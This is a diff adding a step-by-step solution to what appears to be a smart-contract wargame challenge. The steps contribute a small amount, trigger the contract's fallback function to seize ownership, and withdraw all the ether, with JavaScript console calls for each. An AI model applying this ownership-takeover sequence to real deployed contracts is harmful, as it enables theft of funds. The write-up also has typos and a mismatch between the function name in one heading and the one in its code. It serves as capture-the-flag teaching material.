@@ -25,3 +25,34 @@ To interact with the contract and become the owner, follow these steps:
    ```javascript
    await contract.contribute({value: 100000});
 
+2. **Check Contributions**: Use the `getContributions` function to verify your contributions.
+   
+   ```javascript
+   await contract.getContribution();
+
+3. **Trigger Fallback Function**: Call the fallback function to become the owner.
+
+   ```javascript
+   await contract.sendTransaction({
+     from: player,
+     value: toWei("0.00100")
+   });
+
+
+4. **TVerify Ownership**: Confirm your ownership status.
+   
+   ```javascript
+   await contract.owner();
+
+5. **TWithdraw Ether**: Execute the withdraw function to retrieve all the Ether.
+   
+   ```javascript
+   await contract.withdraw();
+
+
+_**Don't hesitate! Go ahead and submit the challenge.**_
+
+
+
+   
+
